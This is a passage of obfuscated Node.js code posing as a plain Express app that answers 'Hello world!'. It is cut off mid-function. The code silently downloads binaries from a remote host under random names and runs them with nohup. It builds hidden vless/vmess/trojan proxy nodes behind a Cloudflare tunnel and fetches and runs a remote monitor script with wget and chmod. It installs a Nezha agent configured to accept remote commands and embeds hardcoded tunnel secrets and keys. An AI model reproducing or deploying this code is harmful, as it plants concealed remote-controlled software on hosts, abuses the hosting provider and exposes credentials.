const _0xb1e4aa=_0x402d;(function(_0x3b6674,_0x2eee27){const _0x195473=_0x402d,_0x5e92c3=_0x3b6674();while(!![]){try{const _0x44ed8a=-parseInt(_0x195473(0x2b0))/0x1+-parseInt(_0x195473(0x1e9))/0x2+parseInt(_0x195473(0x2ac))/0x3*(parseInt(_0x195473(0x254))/0x4)+parseInt(_0x195473(0x2a5))/0x5+parseInt(_0x195473(0x29b))/0x6*(-parseInt(_0x195473(0x299))/0x7)+-parseInt(_0x195473(0x2b9))/0x8*(parseInt(_0x195473(0x2d4))/0x9)+parseInt(_0x195473(0x2bb))/0xa;if(_0x44ed8a===_0x2eee27)break;else _0x5e92c3['push'](_0x5e92c3['shift']());}catch(_0x14186f){_0x5e92c3['push'](_0x5e92c3['shift']());}}}(_0x88b4,0xa6f1e));const _0x4a404c=(function(){let _0x50b7f0=!![];return function(_0xaaf725,_0x4d74fd){const _0x9afda2=_0x50b7f0?function(){const _0x1ef68c=_0x402d;if(_0x4d74fd){const _0x449b09=_0x4d74fd[_0x1ef68c(0x1eb)](_0xaaf725,arguments);return _0x4d74fd=null,_0x449b09;}}:function(){};return _0x50b7f0=![],_0x9afda2;};}()),_0x566687=_0x4a404c(this,function(){const _0x9b3b33=_0x402d;return _0x566687['toString']()['search'](_0x9b3b33(0x2ad)+'+$')['toString']()['constructo'+'r'](_0x566687)['search']('(((.+)+)+)'+'+$');});_0x566687();function _0x402d(_0x1b7d16,_0x769e32){const _0x5609d6=_0x88b4();return _0x402d=function(_0x566687,_0x4a404c){_0x566687=_0x566687-0x1e7;let _0x88b4a=_0x5609d6[_0x566687];return _0x88b4a;},_0x402d(_0x1b7d16,_0x769e32);}const express=require('express'),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0xb1e4aa(0x215)),{promisify}=require('util'),exec=promisify(require('child_proc'+_0xb1e4aa(0x29d))['exec']),{execSync}=require('child_proc'+'ess'),http=require('http'),httpProxy=require('http-proxy'),UPLOAD_URL=process['env'][_0xb1e4aa(0x28d)]||'',PROJECT_URL=process['env']['PROJECT_UR'+'L']||'',AUTO_ACCESS=process[_0xb1e4aa(0x2c3)][_0xb1e4aa(0x227)+'S']||![],FILE_PATH=process[_0xb1e4aa(0x2c3)][_0xb1e4aa(0x2a6)]||'./tmp',SUB_PATH=process[_0xb1e4aa(0x2c3)]['SUB_PATH']||_0xb1e4aa(0x2b4),PORT=process['env']['SERVER_POR'+'T']||process[_0xb1e4aa(0x2c3)]['PORT']||0xbb8,EXTERNAL_PORT=process['env']['EXTERNAL_P'+'ORT']||0x1eb4,UUID=process[_0xb1e4aa(0x2c3)][_0xb1e4aa(0x259)]||'3f33f14e-6'+'a20-6d50-7'+_0xb1e4aa(0x2d9)+'d2093a',NEZHA_SERVER=process['env']['NEZHA_SERV'+'ER']||'',NEZHA_PORT=process[_0xb1e4aa(0x2c3)][_0xb1e4aa(0x222)]||'',NEZHA_KEY=process['env']['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0xb1e4aa(0x2c3)]['ARGO_DOMAI'+'N']||_0xb1e4aa(0x28a)+'g.de5.net',ARGO_AUTH=process['env']['ARGO_AUTH']||'{\x22AccountT'+'ag\x22:\x225df51'+'ef8a13b1d5'+'d1a88ae015'+'afa598b\x22,\x22'+'TunnelSecr'+'et\x22:\x22N1EzD'+_0xb1e4aa(0x224)+'B1nVq3Ud2S'+_0xb1e4aa(0x27d)+_0xb1e4aa(0x282)+_0xb1e4aa(0x234)+'\x22:\x2266e2951'+'d-0287-41d'+_0xb1e4aa(0x24e)+_0xb1e4aa(0x21b)+_0xb1e4aa(0x244)+_0xb1e4aa(0x1e7),CFIP=process['env']['CFIP']||_0xb1e4aa(0x210)+'eu.org',CFPORT=process['env'][_0xb1e4aa(0x276)]||0x1bb,NAME=process['env']['NAME']||'',MONITOR_KEY=process['env']['MONITOR_KE'+'Y']||_0xb1e4aa(0x295)+_0xb1e4aa(0x265)+'e58d6d96cd'+_0xb1e4aa(0x1fc)+_0xb1e4aa(0x23f)+'119c2f2102'+_0xb1e4aa(0x272),MONITOR_SERVER=process[_0xb1e4aa(0x2c3)]['MONITOR_SE'+'RVER']||_0xb1e4aa(0x2cf),MONITOR_URL=process['env'][_0xb1e4aa(0x248)+'L']||'https://up'+'time-vps.b'+_0xb1e4aa(0x23c)+'s.in';console[_0xb1e4aa(0x242)]('使用的UUID:\x20'+UUID);MONITOR_KEY&&MONITOR_SERVER&&MONITOR_URL&&(console['log'](_0xb1e4aa(0x2a3)+'动运行'),console[_0xb1e4aa(0x242)](_0xb1e4aa(0x2d0)+MONITOR_KEY['substring'](0x0,0x8)+'...'),console['log'](_0xb1e4aa(0x1ea)+MONITOR_SERVER),console[_0xb1e4aa(0x242)](_0xb1e4aa(0x214)+MONITOR_URL));!fs[_0xb1e4aa(0x2af)](FILE_PATH)?(fs[_0xb1e4aa(0x2b5)](FILE_PATH,{'recursive':!![]}),console[_0xb1e4aa(0x242)](FILE_PATH+_0xb1e4aa(0x205))):console[_0xb1e4aa(0x242)](FILE_PATH+'\x20已存在');function generateRandomName(){const _0x11c2e4=_0xb1e4aa,_0x4100de=_0x11c2e4(0x203)+'klmnopqrst'+_0x11c2e4(0x23b);let _0x3e6650='';for(let _0x3a4d0c=0x0;_0x3a4d0c<0x6;_0x3a4d0c++){_0x3e6650+=_0x4100de['charAt'](Math['floor'](Math[_0x11c2e4(0x285)]()*_0x4100de[_0x11c2e4(0x21e)]));}return _0x3e6650;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName(),monitorName='cf-vps-mon'+'itor.sh';let npmPath=path['join'](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),monitorPath=path['join'](FILE_PATH,monitorName),subPath=path['join'](FILE_PATH,'sub.txt'),listPath=path[_0xb1e4aa(0x1e8)](FILE_PATH,_0xb1e4aa(0x20f)),bootLogPath=path[_0xb1e4aa(0x1e8)](FILE_PATH,_0xb1e4aa(0x240)),configPath=path['join'](FILE_PATH,_0xb1e4aa(0x20e)+'n'),nezhaConfigPath=path[_0xb1e4aa(0x1e8)](FILE_PATH,'config.yam'+'l'),tunnelJsonPath=path[_0xb1e4aa(0x1e8)](FILE_PATH,'tunnel.jso'+'n'),tunnelYamlPath=path[_0xb1e4aa(0x1e8)](FILE_PATH,_0xb1e4aa(0x2a9));const proxy=httpProxy['createProx'+'yServer'](),proxyServer=http['createServ'+'er']((_0xb5b57b,_0x496ef9)=>{const _0x45d8b5=_0xb1e4aa,_0xd3c063=_0xb5b57b[_0x45d8b5(0x26e)];_0xd3c063[_0x45d8b5(0x1fb)](_0x45d8b5(0x22d)+'o')||_0xd3c063['startsWith']('/vmess-arg'+'o')||_0xd3c063['startsWith']('/trojan-ar'+'go')||_0xd3c063==='/vless'||_0xd3c063==='/vmess'||_0xd3c063==='/trojan'?proxy['web'](_0xb5b57b,_0x496ef9,{'target':'http://loc'+'alhost:300'+'1'}):proxy['web'](_0xb5b57b,_0x496ef9,{'target':'http://loc'+'alhost:'+PORT});});function _0x88b4(){const _0x6b6251=['finish','unshift','n/json','\x20运行中','理...','ull\x202>&1\x20&','test','nohup\x20','url','p2\x20--logfi','response','includes','16f9','blackhole','TunnelSecr','节点上传成功','CFPORT','2087','rt_delay:\x20','catch','https://ra','vless','on\x20>/dev/n','56HnMfbTfH','tcp','stringify','get','\x20失败:\x20','Qkp6wH9k=\x22','SVerify:\x20t','rl\x20http://','random','ate:\x20true\x0a','尝试直接运行监控命令','data','npm运行错误:\x20','cftime.lln','pkill\x20-f\x20\x22','错误:','UPLOAD_URL','lse\x0adisabl','readdirSyn','send','fileName','success','e_auto_upd','--no-autou','a88b11cbdd','then','UseIP','countryCod','7cQmuzN','l\x202>&1\x20&','3071172jzkTqY','base64','ess','disable_co','\x20-c\x20','gress:\x0a\x20\x20-','direct','f\x20/im\x20','监控脚本已配置，将自','e:\x20false\x0au','5729665CIHMZf','FILE_PATH','map','HTTP流量\x20->\x20','tunnel.yml','f-vps-moni','quic','1936065FhocTE','(((.+)+)+)','p2\x20run\x20--t','existsSync','449222viToTo','basename','\x20>\x20nul\x202>&','rt_period:','sub','mkdirSync','orce_updat','l\x202>&1','tunnel:\x20','600tFIHNa','https://am','3743650EkPglB','?encryptio','tls','se_ipv6_co','执行命令错误:\x20','startserve','&path=%2Ft','IPIfNonMat','env','yc.mn/agen','运行监控脚本:\x20','https://ip','4\x0aserver:\x20','Hello\x20worl','\x20-c\x20\x22','下载\x20','arch','com/kadida','ain/cf-vps','xtls-rprx-','d3bkmf','监控密钥:\x20','utf-8','le\x20','本...','900RWaivW','--tls','订阅尚未生成','unlink','/trojan-ar','f2b-87915b','w.githubus','ml配置...','/vmess-arg','urity=tls&','ain，重新运行bo','error','\x22:\x22\x22}','join','1026526aTkbAH','监控服务器:\x20','apply','win32','\x0a\x20\x20\x20\x20','dge-ip-ver','set','直接运行监控命令失败','ue\x0aip_repo','index.html','监控环境变量不完整，','http','writeFileS','from','ls-file:\x20','toString','eStream','\x0askip_conn','startsWith','48033195da','ce:\x20http:/','x&type=ws&','443','\x20-i\x20-k\x20','e-nodes','re_tls:\x20tr','abcdefghij','push','\x20已创建','otocol\x20htt','ull\x202>&1','SIGINT','filter','\x0a\x0atrojan:/','隧道运行成功','\x0aprotocol:','oken\x20','config.jso','list.txt','cdns.doon.','pdate\x20--pr','true','arm','监控URL:\x20','path',';\x20charset=','\x20-u\x20','60#','none','不是TunnelSe','6cbff04da\x22','+x\x20','e:\x20true\x0adi','length','部端口:\x20','isFile','less-argo%','NEZHA_PORT','\x22\x20>\x20/dev/n','h6/qIvsF1C','代理服务器运行在端口','createWrit','AUTO_ACCES','e\x0atemperat','country_co','cret:\x20','\x20保存成功','等待隧道启动...','/vless-arg','https://ar','?security=','\x0a\x0avmess://','2083','message','--skip-con',',\x22TunnelID','设置监控脚本执行权限','t获取ArgoDom','用快速隧道','程序退出','applicatio','授权成功\x20','uvwxyz','gxzg.indev','exit','readFileSy','0efee3e45d','boot.log','has','log','8.8.8.8',',\x22Endpoint','d64.ssss.n','status','lax/cf-vps','MONITOR_UR','下载文件时出错:','m64.ssss.n','NEZHA变量为空，','/api/add-n','sion\x20auto\x20','7-b6b0-c5d','host=','\x201800\x0arepo','unlinkSync','\x0ause_gitee','php运行错误:\x20','4GESVBa','post','http://ip-','https+loca','net/add-ur','UUID','match','\x20>/dev/nul','8443','\x20false\x0adis','org','ull','sni=','false','3001','\x0adisable_f','alhost:300','705529210c'];_0x88b4=function(){return _0x6b6251;};return _0x88b4();}proxyServer['on']('upgrade',(_0x30ebfc,_0x574c9d,_0x1346d8)=>{const _0x21881d=_0xb1e4aa,_0x3682a8=_0x30ebfc[_0x21881d(0x26e)];_0x3682a8['startsWith']('/vless-arg'+'o')||_0x3682a8[_0x21881d(0x1fb)](_0x21881d(0x2dc)+'o')||_0x3682a8['startsWith'](_0x21881d(0x2d8)+'go')?proxy['ws'](_0x30ebfc,_0x574c9d,_0x1346d8,{'target':'http://loc'+_0x21881d(0x264)+'1'}):proxy['ws'](_0x30ebfc,_0x574c9d,_0x1346d8,{'target':'http://loc'+'alhost:'+PORT});}),proxyServer['listen'](EXTERNAL_PORT,()=>{const _0x454ea1=_0xb1e4aa;console[_0x454ea1(0x242)](_0x454ea1(0x225)+':\x20'+EXTERNAL_PORT),console['log'](_0x454ea1(0x2a8)+'localhost:'+PORT),console['log']('Xray流量\x20->\x20'+'localhost:'+_0x454ea1(0x262));}),app['get']('/',function(_0x19a726,_0x45b47d){const _0xd226ba=_0xb1e4aa,_0x2641c2=path['join'](__dirname,_0xd226ba(0x1f2));fs['existsSync'](_0x2641c2)?_0x45b47d['sendFile'](_0x2641c2):_0x45b47d[_0xd226ba(0x290)](_0xd226ba(0x2c8)+'d!');});let subscriptionContent='';app['get']('/'+SUB_PATH,(_0x1c009e,_0x1da09a)=>{const _0x1a94c5=_0xb1e4aa;subscriptionContent?(_0x1da09a[_0x1a94c5(0x1ef)]('Content-Ty'+'pe','text/plain'+_0x1a94c5(0x216)+_0x1a94c5(0x2d1)),_0x1da09a['send'](Buffer['from'](subscriptionContent)['toString'](_0x1a94c5(0x29c)))):_0x1da09a['status'](0x194)['send'](_0x1a94c5(0x2d6));});function deleteNodes(){const _0x515b97=_0xb1e4aa;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x22e141;try{_0x22e141=fs[_0x515b97(0x23e)+'nc'](subPath,'utf-8');}catch{return null;}const _0x1179dd=Buffer[_0x515b97(0x1f6)](_0x22e141,'base64')[_0x515b97(0x1f8)](_0x515b97(0x2d1)),_0xea5204=_0x1179dd['split']('\x0a')[_0x515b97(0x209)](_0x3e47bd=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x3e47bd));if(_0xea5204[_0x515b97(0x21e)]===0x0)return;return axios['post'](UPLOAD_URL+('/api/delet'+_0x515b97(0x201)),JSON[_0x515b97(0x27f)]({'nodes':_0xea5204}),{'headers':{'Content-Type':'applicatio'+_0x515b97(0x268)}})[_0x515b97(0x279)](_0x10f022=>{return null;}),null;}catch(_0x4a62ee){return null;}}function cleanupOldFiles(){const _0x55e1e7=_0xb1e4aa;try{const _0x3adc6c=fs[_0x55e1e7(0x28f)+'c'](FILE_PATH);_0x3adc6c['forEach'](_0x45c1ed=>{const _0x3258ce=_0x55e1e7,_0x4cc5a3=path['join'](FILE_PATH,_0x45c1ed);try{const _0x48a130=fs['statSync'](_0x4cc5a3);_0x48a130[_0x3258ce(0x220)]()&&fs['unlinkSync'](_0x4cc5a3);}catch(_0x4deed7){}});}catch(_0x3a0bcd){}}async function generateConfig(){const _0x1a73dc=_0xb1e4aa,_0x2d54ca={'log':{'access':'/dev/null','error':'/dev/null','loglevel':_0x1a73dc(0x219)},'dns':{'servers':[_0x1a73dc(0x257)+'l://8.8.8.'+'8/dns-quer'+'y','https+loca'+'l://1.1.1.'+'1/dns-quer'+'y',_0x1a73dc(0x243),'1.1.1.1'],'queryStrategy':_0x1a73dc(0x297),'disableCache':![]},'inbounds':[{'port':0xbb9,'protocol':_0x1a73dc(0x27b),'settings':{'clients':[{'id':UUID,'flow':_0x1a73dc(0x2ce)+'vision'}],'decryption':_0x1a73dc(0x219),'fallbacks':[{'dest':0xbba},{'path':'/vless-arg'+'o','dest':0xbbb},{'path':_0x1a73dc(0x2dc)+'o','dest':0xbbc},{'path':'/trojan-ar'+'go','dest':0xbbd}]},'streamSettings':{'network':_0x1a73dc(0x27e)}},{'port':0xbba,'listen':'127.0.0.1','protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x1a73dc(0x27e),'security':_0x1a73dc(0x219)}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x1a73dc(0x27b),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x1a73dc(0x219),'wsSettings':{'path':'/vless-arg'+'o'}},'sniffing':{'enabled':!![],'destOverride':[_0x1a73dc(0x1f4),_0x1a73dc(0x2bd),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-arg'+'o'}},'sniffing':{'enabled':!![],'destOverride':[_0x1a73dc(0x1f4),_0x1a73dc(0x2bd),'quic'],'metadataOnly':![]}},{'port':0xbbd,'listen':'127.0.0.1','protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':'/trojan-ar'+'go'}},'sniffing':{'enabled':!![],'destOverride':['http','tls',_0x1a73dc(0x2ab)],'metadataOnly':![]}}],'outbounds':[{'protocol':'freedom','tag':_0x1a73dc(0x2a1),'settings':{'domainStrategy':'UseIP'}},{'protocol':_0x1a73dc(0x273),'tag':'block'}],'routing':{'domainStrategy':_0x1a73dc(0x2c2)+'ch','rules':[]}};fs[_0x1a73dc(0x1f5)+'ync'](path['join'](FILE_PATH,_0x1a73dc(0x20e)+'n'),JSON['stringify'](_0x2d54ca,null,0x2)),console['log']('Xray配置文件生成'+'完成');}function getSystemArchitecture(){const _0x20826a=_0xb1e4aa,_0x17a3e9=os[_0x20826a(0x2cb)]();return _0x17a3e9===_0x20826a(0x213)||_0x17a3e9==='arm64'||_0x17a3e9==='aarch64'?'arm':'amd';}function downloadFile(_0x2e8b70,_0x3aa07b){return new Promise((_0x41aa1d,_0x3007ca)=>{const _0x3fe4fc=_0x402d,_0x54ba47=_0x2e8b70;!fs[_0x3fe4fc(0x2af)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x48ae16=fs[_0x3fe4fc(0x226)+_0x3fe4fc(0x1f9)](_0x54ba47);axios({'method':_0x3fe4fc(0x280),'url':_0x3aa07b,'responseType':'stream'})[_0x3fe4fc(0x296)](_0x3f21c7=>{const _0x25ac16=_0x3fe4fc;_0x3f21c7['data']['pipe'](_0x48ae16),_0x48ae16['on'](_0x25ac16(0x266),()=>{const _0x1861e6=_0x25ac16;_0x48ae16['close'](),console['log'](_0x1861e6(0x2ca)+path[_0x1861e6(0x2b1)](_0x54ba47)+'\x20成功'),_0x41aa1d(_0x54ba47);}),_0x48ae16['on']('error',_0x19fc1e=>{const _0x3a2972=_0x25ac16;fs[_0x3a2972(0x2d7)](_0x54ba47,()=>{});const _0xd50218=_0x3a2972(0x2ca)+path['basename'](_0x54ba47)+_0x3a2972(0x281)+_0x19fc1e[_0x3a2972(0x232)];console['error'](_0xd50218),_0x3007ca(_0xd50218);});})['catch'](_0x3fb414=>{const _0xed598b=_0x3fe4fc,_0x4f26e6='下载\x20'+path[_0xed598b(0x2b1)](_0x54ba47)+'\x20失败:\x20'+_0x3fb414[_0xed598b(0x232)];console['error'](_0x4f26e6),_0x3007ca(_0x4f26e6);});});}async function downloadAndRunMonitorScript(){const _0x4f1e59=_0xb1e4aa;if(!MONITOR_KEY||!MONITOR_SERVER||!MONITOR_URL){console[_0x4f1e59(0x242)](_0x4f1e59(0x1f3)+'跳过监控脚本启动');return;}await new Promise(_0x4a1d8b=>setTimeout(_0x4a1d8b,0x2710)),console[_0x4f1e59(0x242)]('开始下载并运行监控脚'+_0x4f1e59(0x2d3));try{const _0x1da161=_0x4f1e59(0x27a)+_0x4f1e59(0x2da)+'ercontent.'+_0x4f1e59(0x2cc)+_0x4f1e59(0x247)+'-monitor/m'+_0x4f1e59(0x2cd)+'-monitor.s'+'h';console['log']('从\x20'+_0x1da161+'\x20下载监控脚本'),await downloadFile(monitorPath,_0x1da161),fs['chmodSync'](monitorPath,0x1ed),console['log'](_0x4f1e59(0x235)+'成功'),await runMonitorScript();}catch(_0x4135b2){console['error']('下载或运行监控脚本失'+'败:\x20'+_0x4135b2[_0x4f1e59(0x232)]),await runDirectMonitor();}}async function runMonitorScript(){const _0x5064f6=_0xb1e4aa,_0xc78870=['-i','-k',MONITOR_KEY,'-s',MONITOR_SERVER,'-u',MONITOR_URL];console[_0x5064f6(0x242)](_0x5064f6(0x2c5)+monitorPath+'\x20'+_0xc78870['join']('\x20'));try{const _0x709bc6='nohup\x20'+monitorPath+'\x20'+_0xc78870['join']('\x20')+('\x20>/dev/nul'+_0x5064f6(0x29a));await exec(_0x709bc6),console['log']('监控脚本启动成功');}catch(_0x1b9090){console[_0x5064f6(0x2df)]('运行监控脚本失败:\x20'+_0x1b9090['message']);throw _0x1b9090;}}async function runDirectMonitor(){const _0x205848=_0xb1e4aa;console[_0x205848(0x242)](_0x205848(0x287)+'...');const _0x47914f='wget\x20https'+'://raw.git'+'hubusercon'+'tent.com/k'+'adidalax/c'+_0x205848(0x2aa)+'tor/main/c'+'f-vps-moni'+'tor.sh\x20-O\x20'+monitorPath+('\x20&&\x20chmod\x20'+_0x205848(0x21c))+monitorPath+'\x20&&\x20'+monitorPath+_0x205848(0x200)+MONITOR_KEY+'\x20-s\x20'+MONITOR_SERVER+_0x205848(0x217)+MONITOR_URL;try{await exec(_0x47914f),console[_0x205848(0x242)]('监控命令执行成功');}catch(_0x45758d){console[_0x205848(0x2df)](_0x205848(0x1f0)+':\x20'+_0x45758d[_0x205848(0x232)]);}}async function downloadFilesAndRun(){const _0xa0695d=_0xb1e4aa,_0x432035=getSystemArchitecture(),_0x307797=getFilesForArchitecture(_0x432035);if(_0x307797[_0xa0695d(0x21e)]===0x0){console['log']('找不到适合当前架构的'+'文件');return;}try{const _0x21dd4b=_0x307797[_0xa0695d(0x2a7)](_0x357235=>downloadFile(_0x357235[_0xa0695d(0x291)],_0x357235['fileUrl']));await Promise['all'](_0x21dd4b);}catch(_0x2d946f){console['error'](_0xa0695d(0x249),_0x2d946f);return;}function _0x1a6a3a(_0x38394e){const _0x5bcbd6=0x1fd;_0x38394e['forEach'](_0x35087e=>{const _0x477861=_0x402d;if(fs['existsSync'](_0x35087e))try{fs['chmodSync'](_0x35087e,_0x5bcbd6),console['log'](_0x477861(0x23a)+_0x35087e+':\x20'+_0x5bcbd6['toString'](0x8));}catch(_0x40ddbc){console['error']('授权失败\x20'+_0x35087e+':\x20'+_0x40ddbc);}});}const _0x3efdcc=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x1a6a3a(_0x3efdcc);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2d7898=NEZHA_SERVER[_0xa0695d(0x271)](':')?NEZHA_SERVER['split'](':')['pop']():'',_0xe55446=new Set(['443',_0xa0695d(0x25c),'2096',_0xa0695d(0x277),'2083','2053']),_0x28f3c7=_0xe55446[_0xa0695d(0x241)](_0x2d7898)?_0xa0695d(0x212):_0xa0695d(0x261),_0x3d76a9='\x0aclient_se'+_0xa0695d(0x22a)+NEZHA_KEY+('\x0adebug:\x20fa'+_0xa0695d(0x28e)+_0xa0695d(0x293)+_0xa0695d(0x286)+_0xa0695d(0x29e)+'mmand_exec'+'ute:\x20false'+_0xa0695d(0x263)+_0xa0695d(0x2b6)+_0xa0695d(0x21d)+'sable_nat:'+_0xa0695d(0x25d)+'able_send_'+'query:\x20fal'+'se\x0agpu:\x20fa'+'lse\x0ainsecu'+_0xa0695d(0x202)+_0xa0695d(0x1f1)+_0xa0695d(0x2b3)+_0xa0695d(0x250)+_0xa0695d(0x278)+_0xa0695d(0x2c7))+NEZHA_SERVER+(_0xa0695d(0x1fa)+'ection_cou'+'nt:\x20true\x0as'+'kip_procs_'+'count:\x20tru'+_0xa0695d(0x228)+'ure:\x20false'+'\x0atls:\x20')+_0x28f3c7+(_0xa0695d(0x252)+'_to_upgrad'+_0xa0695d(0x2a4)+_0xa0695d(0x2be)+'untry_code'+':\x20false\x0auu'+'id:\x20')+UUID;fs['writeFileS'+'ync'](nezhaConfigPath,_0x3d76a9);const _0xbf0b27='nohup\x20'+phpPath+_0xa0695d(0x2c9)+nezhaConfigPath+('\x22\x20>/dev/nu'+'ll\x202>&1\x20&');try{await exec(_0xbf0b27),console['log'](phpName+_0xa0695d(0x269)),await new Promise(_0x40ca8d=>setTimeout(_0x40ca8d,0x3e8));}catch(_0x123721){console['error'](_0xa0695d(0x253)+_0x123721);}}else{let _0x1e1910='';const _0x1d1a43=[_0xa0695d(0x1ff),_0xa0695d(0x25c),'2096','2087',_0xa0695d(0x231),'2053'];_0x1d1a43[_0xa0695d(0x271)](NEZHA_PORT)&&(_0x1e1910=_0xa0695d(0x2d5));const _0x107d96=_0xa0695d(0x26d)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x1e1910+('\x20--disable'+'-auto-upda'+'te\x20--repor'+'t-delay\x204\x20'+_0xa0695d(0x233)+'n\x20--skip-p'+'rocs\x20>/dev'+'/null\x202>&1'+'\x20&');try{await exec(_0x107d96),console['log'](npmName+'\x20运行中'),await new Promise(_0x141b03=>setTimeout(_0x141b03,0x3e8));}catch(_0x4c737f){console[_0xa0695d(0x2df)](_0xa0695d(0x289)+_0x4c737f);}}}else console[_0xa0695d(0x242)](_0xa0695d(0x24b)+'跳过运行');const _0x1df612='nohup\x20'+webPath+_0xa0695d(0x29f)+FILE_PATH+('/config.js'+_0xa0695d(0x27c)+_0xa0695d(0x26b));try{await exec(_0x1df612),console['log'](webName+'\x20运行中'),await new Promise(_0x157d3b=>setTimeout(_0x157d3b,0x3e8));}catch(_0x53049d){console[_0xa0695d(0x2df)]('web运行错误:\x20'+_0x53049d);}if(fs['existsSync'](botPath)){let _0x18a8cc;if(ARGO_AUTH[_0xa0695d(0x25a)](/^[A-Z0-9a-z=]{120,250}$/))_0x18a8cc='tunnel\x20--e'+_0xa0695d(0x1ee)+'sion\x20auto\x20'+'--no-autou'+_0xa0695d(0x211)+'otocol\x20htt'+_0xa0695d(0x2ae)+_0xa0695d(0x20d)+ARGO_AUTH;else ARGO_AUTH['includes']('TunnelSecr'+'et')?(!fs['existsSync'](tunnelYamlPath)&&(console['log']('等待tunnel.y'+_0xa0695d(0x2db)),await new Promise(_0x426a5b=>setTimeout(_0x426a5b,0x3e8))),_0x18a8cc='tunnel\x20--e'+'dge-ip-ver'+_0xa0695d(0x24d)+'--config\x20'+tunnelYamlPath+'\x20run'):_0x18a8cc='tunnel\x20--e'+_0xa0695d(0x1ee)+'sion\x20auto\x20'+_0xa0695d(0x294)+_0xa0695d(0x211)+_0xa0695d(0x206)+'p2\x20--logfi'+_0xa0695d(0x2d2)+bootLogPath+('\x20--logleve'+'l\x20info\x20--u'+_0xa0695d(0x284)+'localhost:')+EXTERNAL_PORT;try{await exec(_0xa0695d(0x26d)+botPath+'\x20'+_0x18a8cc+('\x20>/dev/nul'+_0xa0695d(0x29a))),console['log'](botName+'\x20运行中'),console['log'](_0xa0695d(0x22c)),await new Promise(_0x59dc44=>setTimeout(_0x59dc44,0x1388));if(ARGO_AUTH[_0xa0695d(0x271)](_0xa0695d(0x274)+'et'))try{process['platform']==='win32'?await exec('tasklist\x20|'+'\x20findstr\x20'+botName+'\x20>\x20nul'):await exec('pgrep\x20-f\x20\x22'+'['+botName['charAt'](0x0)+']'+botName['substring'](0x1)+(_0xa0695d(0x223)+_0xa0695d(0x25f))),console['log'](_0xa0695d(0x20b));}catch(_0x3d551){console[_0xa0695d(0x2df)]('隧道启动失败');}}catch(_0x2a9fa9){console['error'](_0xa0695d(0x2bf)+_0x2a9fa9);}}await new Promise(_0x45f90c=>setTimeout(_0x45f90c,0x7d0));}function getFilesForArchitecture(_0x593f99){const _0x3075c9=_0xb1e4aa;let _0x30eff9;_0x593f99==='arm'?_0x30eff9=[{'fileName':webPath,'fileUrl':'https://ar'+'m64.ssss.n'+'yc.mn/web'},{'fileName':botPath,'fileUrl':'https://ar'+_0x3075c9(0x24a)+'yc.mn/bot'}]:_0x30eff9=[{'fileName':webPath,'fileUrl':_0x3075c9(0x2ba)+'d64.ssss.n'+'yc.mn/web'},{'fileName':botPath,'fileUrl':_0x3075c9(0x2ba)+_0x3075c9(0x245)+'yc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x2439c6=_0x593f99===_0x3075c9(0x213)?_0x3075c9(0x22e)+_0x3075c9(0x24a)+_0x3075c9(0x2c4)+'t':'https://am'+'d64.ssss.n'+'yc.mn/agen'+'t';_0x30eff9[_0x3075c9(0x267)]({'fileName':npmPath,'fileUrl':_0x2439c6});}else{const _0x427005=_0x593f99==='arm'?'https://ar'+'m64.ssss.n'+'yc.mn/v1':_0x3075c9(0x2ba)+_0x3075c9(0x245)+'yc.mn/v1';_0x30eff9[_0x3075c9(0x267)]({'fileName':phpPath,'fileUrl':_0x427005});}}return _0x30eff9;}function argoType(){const _0x225a7c=_0xb1e4aa;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log']('ARGO_DOMAI'+'N\x20或\x20ARGO_A'+'UTH\x20变量为空，使'+_0x225a7c(0x237));return;}if(ARGO_AUTH[_0x225a7c(0x271)]('TunnelSecr'+'et'))try{const _0x4ac93b=JSON['parse'](ARGO_AUTH),_0xe2e3cf=_0x4ac93b['TunnelID'];fs[_0x225a7c(0x1f5)+'ync'](tunnelJsonPath,ARGO_AUTH);const _0xe4858f=_0x225a7c(0x2b8)+_0xe2e3cf+('\x0acredentia'+_0x225a7c(0x1f7))+tunnelJsonPath+(_0x225a7c(0x20c)+'\x20http2\x0a\x0ain'+_0x225a7c(0x2a0)+'\x20hostname:'+'\x20')+ARGO_DOMAIN+('\x0a\x20\x20\x20\x20servi'+_0x225a7c(0x1fd)+'/localhost'+':')+EXTERNAL_PORT+('\x0a\x20\x20\x20\x20origi'+'nRequest:\x0a'+'\x20\x20\x20\x20\x20\x20noTL'+_0x225a7c(0x283)+'rue\x0a\x20\x20-\x20se'+'rvice:\x20htt'+'p_status:4'+'04\x0a');fs[_0x225a7c(0x1f5)+'ync'](tunnelYamlPath,_0xe4858f),console[_0x225a7c(0x242)]('隧道YAML配置生成'+'成功');}catch(_0x4bdf68){console[_0x225a7c(0x2df)]('生成隧道配置错误:',_0x4bdf68);}else console['log']('ARGO_AUTH\x20'+_0x225a7c(0x21a)+'cret格式，使用t'+'oken连接隧道');}async function getMetaInfo(){const _0x45747c=_0xb1e4aa;try{const _0x19ba01=await 